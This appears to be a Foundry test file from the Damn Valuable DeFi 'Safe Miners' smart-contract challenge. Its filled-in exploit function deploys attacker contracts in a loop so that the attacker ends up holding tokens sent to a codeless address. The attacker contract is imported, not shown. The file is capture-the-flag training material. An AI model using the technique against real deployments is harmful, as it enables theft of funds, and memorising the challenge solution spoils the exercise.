// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/DamnValuableToken.sol";
import "../../src/attacker-contracts/SafeMinersAttacker.sol";

contract SafeMinersTest is Test {
    uint256 internal constant DEPOSIT_TOKEN_AMOUNT = 2000042 ether;
    address internal constant DEPOSIT_ADDRESS = address(0x79658d35aB5c38B6b988C23D02e0410A380B8D5c);

    DamnValuableToken internal token;

    address internal deployer = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
    address internal attacker = address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8);

    function setUp() public {
        startHoax(deployer);

        // Deploy Damn Valuable Token contract
        token = new DamnValuableToken();

        // Deposit the DVT tokens to the address
        token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are correctly set
        assertEq(token.balanceOf(DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertEq(token.balanceOf(attacker), 0);

        vm.stopPrank();
    }

    function testExploit() public {
        /** YOUR EXPLOIT GOES HERE */
        startHoax(attacker);
        for (uint256 i; i != 5; ++i) {
            new SafeMinersAttacker(attacker, token, 80);
        }
        vm.stopPrank();

        /** SUCCESS CONDITION */
        assertEq(token.balanceOf(DEPOSIT_ADDRESS), 0);
        assertEq(token.balanceOf(attacker), DEPOSIT_TOKEN_AMOUNT);
    }
}
